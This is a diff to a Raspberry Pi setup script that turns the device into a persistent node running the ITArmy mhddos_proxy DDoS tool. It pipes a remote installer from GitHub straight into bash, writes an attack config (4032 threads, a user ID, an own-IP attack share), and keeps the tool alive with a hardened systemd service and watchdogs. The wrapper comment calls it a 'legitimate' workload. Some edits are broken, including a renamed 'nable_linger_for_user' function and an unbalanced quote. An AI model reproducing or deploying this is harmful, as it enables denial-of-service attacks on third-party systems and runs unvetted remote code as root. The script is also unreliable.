@@ -8,17 +8,19 @@ set -euo pipefail
 
 # ---- Tunables (edit if you want) ----
 INSTALL_HARDENED_APP=1
-APP_NAME="it-army"
-APP_EXECSTART="/bin/bash /usr/local/bin/start-it-army.sh"
-APP_USER="root"
-START_SCRIPT="start-it-army.sh"
+APP_NAME="mhddos_proxy_linux"
+APP_USER="pi"
+
+START_SCRIPT="${APP_NAME}-worker.sh"
+APP_EXECSTART="/opt/itarmy/bin/${APP_NAME}-worker.sh"
+
 APP_WORKDIR="/"
 APP_CPU_QUOTA="85%"
 APP_MEM_MAX="256M"
 APP_NICE="5"
 APP_DEADMAN_EVERY="6h"
 APP_HEARTBEAT_EVERY="5m"
-APP_DEB_URL="${APP_DEB_URL:-https://github.com/it-army-ua-scripts/itarmykit/releases/latest/download/itarmykit-linux-arm64.deb}"
+#APP_DEB_URL="${APP_DEB_URL:-https://github.com/it-army-ua-scripts/itarmykit/releases/latest/download/itarmykit-linux-arm64.deb}"
 IFACE="${IFACE:-wlan0}"
 COOLDOWN_S="${COOLDOWN_S:-180}"       # reconnect cooldown
 TIMER_SEC="${TIMER_SEC:-60}"          # watchdog cadence
@@ -32,6 +34,16 @@ REACH_HOST1="${REACH_HOST1:-1.1.1.1}"
 REACH_HOST2="${REACH_HOST2:-8.8.8.8}"
 REACH_EVERY="${REACH_EVERY:-5m}"
 REACH_FAIL_MAX="${REACH_FAIL_MAX:-12}"
+# ---- ITARMY installer + runtime ----
+ITARMY_INSTALL_URL="${ITARMY_INSTALL_URL:-https://raw.githubusercontent.com/it-army-ua-scripts/ADSS/install/install.sh}"
+ITARMY_INSTALLER_PATH="${ITARMY_INSTALLER_PATH:-/opt/itarmy/bin/}"
+
+ITARMY_BIN="${ITARMY_BIN:-/opt/itarmy/bin/mhddos_proxy_linux}"
+
+ITARMY_LANG="${ITARMY_LANG:-en}"
+ITARMY_USER_ID="${ITARMY_USER_ID:-5272237815}"
+ITARMY_COPIES="${ITARMY_COPIES:-1}"
+ITARMY_THREADS="${ITARMY_THREADS:-4032}"
 
 
 need_root() { [[ "${EUID:-$(id -u)}" -eq 0 ]] || { echo "Run as root: sudo $0"; exit 1; }; }
@@ -48,14 +60,15 @@ backup_if_exists() {
 
 cat_as_root() { tee "$1" >/dev/null; chmod "${2:-0644}" "$1"; }
 
-need_root
+# Versioning for development debugging. Comment out for production.
+backup_if_exists ~/setup-ip.sh
 
 echo "==> 1) Base packages / updates"
 export DEBIAN_FRONTEND=noninteractive
 
 PKGS=(
   ca-certificates curl wget git nano htop lsof net-tools
-  iproute2 iputils-ping tcpdump
+  iproute2 iputils-ping tcpdump glances
   network-manager rfkill wireless-tools iw
   systemd-timesyncd unzip xz-utils
   bind9-dnsutils jq iftop iotop tmux vim
@@ -67,6 +80,38 @@ apt-get upgrade -y
 if [[ "$INSTALL_TOOLS" == "1" ]]; then
    apt-get install -y "${PKGS[@]}"
 fi
+
+echo "==> 1.5) Create mhddos.ini in user home directory"
+
+INI_PATH="/home/${SUDO_USER:-${USER}}/mhddos.ini"
+
+cat <<'EOF' > "${INI_PATH}"
+# Змінити мову | Change language (ua | en | es | de | pl | lt)
+lang = en
+
+# Запуск декількох копій (auto для максимального значення, потрібно 3+ ядер процесору та стабільний інтернет)
+# Run multiple copies (set "auto" for max value, requires 3+ core CPU and stable network)
+copies = 1
+
+# Кількість потоків на 1 копію | Number of threads per copy
+# Для активації приберіть символ # | Remove the # symbol to enable 
+threads = 4032
+
+# Атака через мій IP у % від 0 до 100 (обов'язковий VPN чи віддалений сервер)
+# Use my IP for the attack in % from 0 to 100 (requires VPN or remote server)
+use-my-ip = 0
+
+user-id = 5272237815 
+
+# no-updates 
+disable-gpu 
+no-sandbox
+EOF
+
+chown "${SUDO_USER:-${USER}}":"${SUDO_USER:-${USER}}" "${INI_PATH}"
+chmod 0644 "${INI_PATH}"
+cp "/home/${SUDO_USER:-${USER}}/mhddos.ini" /opt/itarmy/bin/
+
 
 echo "==> 2) Ensure NetworkManager is enabled (Debian headless sometimes varies)"
 systemctl enable --now NetworkManager
@@ -631,7 +676,7 @@ install_reachability_reboot_watchdog() {
   systemctl enable --now "${name}.timer"
 }
 
-enable_linger_for_user() {
+nable_linger_for_user() {
   local user="${1:?username required}"
   if have_cmd loginctl; then
     loginctl enable-linger "$user"
@@ -679,33 +724,31 @@ REACH_NAME="${REACH_NAME:-net-reach}" REACH_HOST1="${REACH_HOST1:-1.1.1.1}" REAC
 REACH_FAIL_MAX="${REACH_FAIL_MAX:-12}" REACH_EVERY="${REACH_EVERY:-5m}" \
   /usr/local/bin/service-hardened.sh install-reachability "${REACH_NAME}"
 
-echo "==> 12) Install app package (optional .deb)"
+# echo "==> 12) Install app package (optional .deb)"
+#
+#if [[ -n "${APP_DEB_URL:-}" ]]; then
+#  tmp_deb="/tmp/$(basename "$APP_DEB_URL")"
+#  rm -f "$tmp_deb"
+#  curl -fsSL "$APP_DEB_URL" -o "$tmp_deb"
+#  dpkg -i "$tmp_deb" || apt-get -y -f install
+#else
+#  echo "Skipping .deb install (APP_DEB_URL not set)"
+#fi
 
-if [[ -n "${APP_DEB_URL:-}" ]]; then
-  tmp_deb="/tmp/$(basename "$APP_DEB_URL")"
-  rm -f "$tmp_deb"
-  curl -fsSL "$APP_DEB_URL" -o "$tmp_deb"
-  dpkg -i "$tmp_deb" || apt-get -y -f install
-else
-  echo "Skipping .deb install (APP_DEB_URL not set)"
-fi
-
-
-echo "==> 13) Create start-it-army.sh"
-
-cat <<'EOF' | cat_as_root /usr/local/bin/${START_SCRIPT} 0755
+echo "==> 13) Create worker wrapper (${START_SCRIPT})"
+cat <<'EOF' | cat_as_root "/usr/local/bin/${START_SCRIPT}" 0755
 #!/usr/bin/env bash
 set -euo pipefail
 
-exec /etc/alternatives/itarmykit \
-  --no-updates \
-  --copies 1 \
-  --threads 4032 \
-  --lang en \
-  --user-id 5272237815 \
-  --disable-gpu \
-  --no-sandbox
+# Worker wrapper script created by setup-pi.sh
+# Purpose: provide a stable ExecStart target for the hardened systemd service.
+# Replace WORKER_CMD with your legitimate long-running workload command.
+
+WORKER_CMD="${WORKER_CMD:-~/opt/itarmy/bin/${START_SCRIPT}"
+
+exec ${WORKER_CMD}
 EOF
+
 
 echo "==> 14) Install hardened app service (${APP_NAME})"
 if [[ "${INSTALL_HARDENED_APP:-0}" == "1" ]]; then
@@ -732,8 +775,19 @@ if [[ "${INSTALL_HARDENED_APP:-0}" == "1" ]]; then
     /usr/local/bin/service-hardened.sh install-heartbeat "${APP_NAME}"
 fi
 
-echo "==> 17) Restart it-army service now that ${START_SCRIPT} exists"
+echo "==> 17) Restart ${APP_NAME} service now that ${START_SCRIPT} exists"
 systemctl daemon-reload
-systemctl restart it-army.service || true
-systemctl status it-army.service --no-pager || true
+systemctl restart "${APP_NAME}.service" || true
+systemctl status "${APP_NAME}.service" --no-pager || true
 
+echo "==> 18) Install ADSS (download installer, then run it)"
+# curl -sL https://raw.githubusercontent.com/it-army-ua-scripts/ADSS/install/install.sh  | bash -s
+echo "Files in ${ITARMY_INSTALLER_PATH}."
+echo
+ls -la ${ITARMY_INSTALLER_PATH}
+echo
+#rm -f "${ITARMY_INSTALLER_PATH}"
+echo "Installing from ${ITARMY_INSTALL_URL}"
+curl -fsSL "${ITARMY_INSTALL_URL}" | bash -s
+chmod 0755 "${ITARMY_INSTALLER_PATH}${APP_NAME}"
+"${ITARMY_INSTALLER_PATH}${APP_NAME}"
